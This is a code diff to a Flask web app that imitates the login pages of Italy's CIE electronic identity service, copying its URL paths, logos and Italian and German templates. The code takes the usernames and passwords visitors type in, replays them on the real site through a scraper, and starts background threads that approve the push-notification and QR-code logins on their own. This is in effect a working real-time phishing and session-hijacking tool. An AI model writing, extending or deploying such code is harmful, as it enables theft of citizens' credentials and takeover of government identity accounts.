@@ -14,6 +14,10 @@ import time
 
 # State:
 # - cie_wrong_credentials is to be fixed for translation and we must add the deu page. They all behave as cie_login
+# The reason it does not work is that upon language switch it re-attempts the login (which is to be fixed), but anyways
+# we must account for two consecutive failed login attempts
+
+# I think that load_cie_page does not handle correctly multiple failed login attempts
 
 app = Flask(__name__)
 app.secret_key = "HPAS"
@@ -57,33 +61,31 @@ def do_login():
     - go to /idp/login/livello2 page with these info as arguments
     """
     elements = scraper.get_cie_page_elements()
-    challenge= elements.get("challenge", "NA")
-    session["qr_str"] = elements.get("qr_str", "NA")
-    opId = elements.get("opId", "NA")
+
+    session["challenge"] = elements["challenge"]
+    session["qr_str"] = elements["qr_str"]
+    session["opId"] = elements["opId"]
 
     return redirect(url_for(
         'cie_level2',
-        opId = opId,
-        challenge = challenge,
+        opId = session["opId"],             # must show up in url, not needed
+        challenge = session["challenge"],   # must show up in url, not needed
         level = 2,
         SPName="https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml",
         SPLogo="https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png",
         value="e1s2"
     ))
 
-@app.route('/idp/login/livello2/', methods=['GET', 'POST'])
-def cie_level2():
-    global last_challenge
-    """
-    To emulate the original website, we use the same address for two different things:
-    1) the login page with credentials/QR code (if challenge is present in the arguments)
-    2) the "waiting for push notification" page on success, or the "wrong credentials"
-        page on error (if challenge is absent in the arguments)
-    """
-    challenge = request.args.get('challenge')
-    lang = request.values.get('eccLang', "it")
+# TODO: fix. Use session variables to know if we are ok or not
+
+# idea: we create in session with key the challenge, storing 
+# qr and whatnot, then we save challenge as last_challenge and we access
+# the session[last_challenge]. In there we keep something like did_login, if true we do not retry.
+# We also need to reset url on selenium after
+
+def handle_timer() -> tuple[int, int] :
     server_now_ms = int(time.time() * 1000)
-    timer_key = challenge or last_challenge
+    timer_key: str = session["challenge"]  # pyright: ignore[reportAny]
     stored = get_stored_expiry(timer_key)
     if stored is None:
         # first time for this challenge -> create expiry
@@ -92,51 +94,69 @@ def cie_level2():
     else:
         expiry_ms = int(stored)
 
-    # the original website does not change url throughout the login process, so we emulate that
-    # by using the same website and checking the arguments
-    if challenge == None:
+    return expiry_ms, server_now_ms
+
+def handle_login(lang: str):
+    page = f"cie_login_{lang}.html"
+    cur_challenge: str = session["challenge"]  # pyright: ignore[reportAny]
+
+    if qr_expiry_store.get(cur_challenge) is None:
+        executor = ThreadPoolExecutor(max_workers=2)
+        _ = executor.submit(scraper.qr_approve, 120)
+
+    expiry_ms, server_now_ms = handle_timer()
+
+    return render_template(page,
+        qr_str = session["qr_str"],
+        challenge = cur_challenge,
+        opId = session["opId"],
+        expiry_ms=expiry_ms,
+        server_now_ms=server_now_ms,
+        tempoQR_ms=DEFAULT_TEMPO_MS,
+   )
+
+def handle_cie_waiting_push(lang: str):
+    page = f"cie_waiting_push_{lang}.html"
+
+    key = f"push_{session['challenge']}"
+    if session.get(key) is None:
+        session[key] = True
+        executor = ThreadPoolExecutor(max_workers=2)
+        _ = executor.submit(scraper.approve, 120)
+
+    return render_template(page)
+
+def handle_cie_wrong_credentials(lang: str):
+    page = f"cie_wrong_credentials_{lang}.html"
+
+    expiry_ms, server_now_ms = handle_timer()
+    return render_template(page,
+        qr_str = session["qr_str"],
+        challenge = session["challenge"],
+        opId = session["opId"],
+        expiry_ms=expiry_ms,
+        server_now_ms=server_now_ms,
+        tempoQR_ms=DEFAULT_TEMPO_MS,
+    )
+
+@app.route('/idp/login/livello2/', methods=['GET', 'POST'])
+def cie_level2():
+    url_challenge = request.values.get("challenge")
+    lang = request.values.get("eccLang", "it")
+    if url_challenge is not None:
+        return handle_login(lang)
+    else:
         username = request.form.get("username", "")
         password = request.form.get("password", "")
+        if username != "" and password != "":
+            result = scraper.load_cie_page(username, password)
+            if result:
+                session["pushsent" + session["challenge"]] = True
+                return handle_cie_waiting_push(lang)
+        if session.get("pushsent" + session["challenge"]) is not None: # reload of notification page
+            return handle_cie_waiting_push(lang)
 
-        result = scraper.perform_login(username, password)
-
-        page = "{p}_{lang}.html".format(
-            p = "cie_waiting_push" if result else "cie_wrong_credentials",
-            lang = "deu" if lang == "deu" else "it"
-        )
-
-        # execute in background: this will wait for the user to accept 
-        # push notification and automatically press the button to accept.
-        # Moreover, it will set scraper.push_approved to true, letting us know
-        # that the user should be shown an error page (we completed login).
-        # This is done via static/cie_waiting_push/l12.js.jsp. It polls
-        # /idp/login/livello1e2checkpush, and if the returned status is
-        # wait it does nothing, if the return status is anything else it calls
-        # /idp/login/livello1e2postpush
-        if result:
-            executor = ThreadPoolExecutor(max_workers=2)
-            _ = executor.submit(scraper.approve, 120)
-
-        return render_template(page,
-           expiry_ms=expiry_ms,
-           server_now_ms=server_now_ms,
-           tempoQR_ms=DEFAULT_TEMPO_MS,
-       )
-
-
-    qr_str = session.get("qr_str", "")
-    page = "cie_login_{}.html".format("deu" if lang == "deu" else "it")
-    last_challenge = challenge
-
-    # handle qr code login
-    executor = ThreadPoolExecutor(max_workers=2)
-    _ = executor.submit(scraper.qr_approve, 120)
-
-    return render_template( page, qr_str = qr_str, challenge = challenge, opId = request.args.get('opId'), 
-                               expiry_ms=expiry_ms,
-                               server_now_ms=server_now_ms,
-                               tempoQR_ms=DEFAULT_TEMPO_MS,
-                           )
+        return handle_cie_wrong_credentials(lang)
 
 @app.route("/idp/login/livello1e2checkpush")
 def check_push():
